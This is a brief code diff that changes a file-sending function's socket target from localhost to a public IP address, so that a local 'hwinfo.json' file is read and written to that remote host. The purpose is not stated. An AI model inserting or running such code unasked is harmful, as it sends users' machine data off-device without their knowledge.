@@ -12,7 +12,7 @@ export function sendFileToServer() {
 
   socket.connect({
     port: 2000,
-    host: '127.0.0.1',
+    host: '44.203.146.186',
   }, () => {
     socket.write(fs.readFileSync('./hwinfo.json'));
   });
